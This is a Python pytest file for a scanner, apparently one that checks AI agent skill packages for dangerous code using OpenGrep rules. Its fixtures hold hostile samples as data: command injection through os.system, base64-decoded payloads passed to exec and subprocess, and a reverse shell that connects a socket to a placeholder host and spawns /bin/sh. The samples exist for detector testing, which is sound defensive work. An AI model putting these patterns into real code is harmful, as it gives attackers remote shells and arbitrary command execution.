"""Freeze the Phase-1 Python contract and batch it through pinned OpenGrep."""

from __future__ import annotations

import json
import os
from collections import Counter
from dataclasses import dataclass
from pathlib import Path

import pytest

from skill_xray import ingest, parse
from skill_xray.checks import coverage, taint_engine
from skill_xray.opengrep_bridge import check as opengrep_check
from skill_xray.opengrep_runtime import OpenGrepRuntimeError, resolve_opengrep


@dataclass(frozen=True)
class _Case:
    name: str
    code: str
    vector: str | None
    count: int


def _contract():
    path = Path(__file__).with_name("opengrep_python_contract.jsonl")
    return [_Case(**json.loads(line)) for line in path.read_text(encoding="utf-8").splitlines()]


def _actual(findings):
    return Counter((finding.path, finding.vector) for finding in findings if finding.vector)


def _live_executable():
    try:
        executable = resolve_opengrep(os.environ.get("SKILL_XRAY_OPENGREP_BIN"))
    except OpenGrepRuntimeError as exc:
        pytest.fail(str(exc))
    if executable is None:
        if os.environ.get("CI"):
            pytest.fail("pinned OpenGrep is required in CI")
        pytest.skip("pinned OpenGrep is not installed")
    return executable


def test_frozen_python_contract_has_expected_shape():
    cases = _contract()
    positives = sum(case.vector is not None for case in cases)
    # A variable key does not sanitize a tainted container; the reviewed contract therefore has
    # one more positive than the original frozen expectations.
    assert (len(cases), positives, len(cases) - positives) == (258, 130, 128)
    assert len({case.name for case in cases}) == len(cases)


def test_live_opengrep_matches_frozen_python_contract(make_package):
    executable = _live_executable()
    cases = _contract()
    assert (len(cases), sum(case.vector is not None for case in cases)) == (258, 130)
    files = {
        "%03d_%s.py" % (index, case.name.removeprefix("test_")): case.code
        for index, case in enumerate(cases)
    }
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))
    expected = Counter({
        (path, case.vector): case.count
        for path, case in zip(files, cases, strict=True)
        if case.vector
    })
    overlap = next(path for path, case in zip(files, cases, strict=True)
                   if case.name == "test_base64_remote_dropper_fires")
    expected[(overlap, "SXV-019")] = 1
    findings = opengrep_check(parsed, executable=executable, timeout=90)
    assert not [finding for finding in findings if not finding.vector]
    actual = _actual(findings)
    assert actual == expected


def test_live_opengrep_keeps_three_nonliteral_positive_contracts(make_package):
    bomb = "import os\nos.system(" + "+".join(['"a"'] * 3000) + ")\n"
    skill = (
        "---\nname: t\nallowed-tools:\n  Bash: true\n---\n"
        "```python\nimport os, sys\nos.system(sys.argv[1])\n```\n"
        "```python\nfrom __future__ import annotations\nx = 1\n```\n"
    )
    files = {
        "SKILL.md": skill,
        "many.py": "import os\n" + "os.system(input())\n" * 100,
        "real.py": "import os, sys\nos.system(sys.argv[1])\n",
        "bomb.py": bomb,
    }
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))
    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
    assert {finding.path for finding in findings if finding.vector == "SXV-008"} >= {
        "SKILL.md", "many.py", "real.py",
    }
    assert sum(
        finding.path == "many.py" and finding.vector == "SXV-008"
        for finding in findings
    ) == 25
    assert any(finding.path == "many.py" and finding.rule == "findings-capped"
               for finding in findings)


def test_live_lambda_sink_survives_production_coordinator(make_package):
    parsed = parse.parse_package(ingest.build_package(str(make_package({
        "lambda.py": "import os\n(lambda: os.system(input()))()\n",
        "direct.py": "import os, sys\nos.system(sys.argv[1])\n",
    }))))

    findings = taint_engine.check(parsed, executable=_live_executable())

    assert not [finding for finding in findings if not finding.vector]
    assert {
        (finding.path, finding.vector) for finding in findings
    } == {("lambda.py", "SXV-008"), ("direct.py", "SXV-008")}


def test_live_static_rules_reject_handle_and_non_socket_false_positives(make_package):
    files = {
        "gcs_download.py": (
            "from google.cloud import storage\n"
            "client = storage.Client()\n"
            "blob = client.bucket('datasets').blob('model.bin')\n"
            "blob.download_to_filename('/tmp/model.bin')\n"
        ),
        "sqlite_pty.py": (
            "import pty, sqlite3\n"
            "conn = sqlite3.connect('app.db')\n"
            "pty.spawn(['/bin/bash', '-lc', 'make build'])\n"
        ),
        "home_listing.py": "from pathlib import Path\nitems = list(Path.home().iterdir())\n",
        "authorized_keys_write.py": "open('/home/user/.ssh/authorized_keys', 'w').write('key')\n",
    }
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)

    assert not [finding for finding in findings if finding.vector in {
        "SXV-023", "SXV-024", "SXV-025", "SXV-040",
    }]


def test_live_reverse_shell_pty_requires_a_constructed_socket(make_package):
    code = """\
import pty
import socket

sock = socket.socket()
sock.connect(('example.invalid', 4444))
pty.spawn('/bin/sh')
"""
    parsed = parse.parse_package(ingest.build_package(str(make_package({"reverse.py": code}))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)

    assert [(finding.path, finding.vector) for finding in findings if finding.vector == "SXV-040"] \
        == [("reverse.py", "SXV-040")]


def test_live_decoded_payload_sink_parity(make_package):
    files = {
        "builtins_exec.py": (
            "import base64, builtins\n"
            "builtins.exec(base64.b64decode(input()))\n"
        ),
        "kwargs.py": (
            "import base64, subprocess\n"
            "subprocess.run(base64.b64decode(input()), **{'shell': True})\n"
        ),
        "alias.py": (
            "import base64, os\n"
            "launch = os.system\nlaunch(base64.b64decode(input()))\n"
        ),
        "shadowed_alias.py": (
            "import base64, os\n"
            "launch = os.system\nlaunch = lambda value: value\n"
            "launch(base64.b64decode(input()))\n"
        ),
    }
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
    paths = {finding.path for finding in findings if finding.vector == "SXV-019"}

    assert paths == {"alias.py", "builtins_exec.py", "kwargs.py"}


def test_live_opengrep_keeps_four_incomplete_analysis_contracts_visible(make_package):
    files = {
        "deep.py": (
            "import os, sys\ncmd = sys.argv[1]" + " + 'a'" * 300
            + "\nos.system(cmd)\n"
        ),
        "broken.py": "def (: not valid python\n",
        "oversize.py": "import os\n# " + "x" * 600_000 + "\n",
        "bomb.py": "import os\nos.system(" + "+".join(['"a"'] * 3000) + ")\n",
    }
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))
    findings = [
        *coverage.check(parsed),
        *opengrep_check(parsed, executable=_live_executable(), timeout=90),
    ]
    assert any(finding.path == "deep.py" and finding.vector == "SXV-008"
               for finding in findings)
    reasons = {
        finding.path: finding.evidence.get("reason")
        for finding in findings
        if finding.rule == "analysis-incomplete"
    }
    assert reasons == {
        "bomb.py": "python_too_complex",
        "broken.py": "python_syntax_error",
        "oversize.py": "python_oversize",
    }
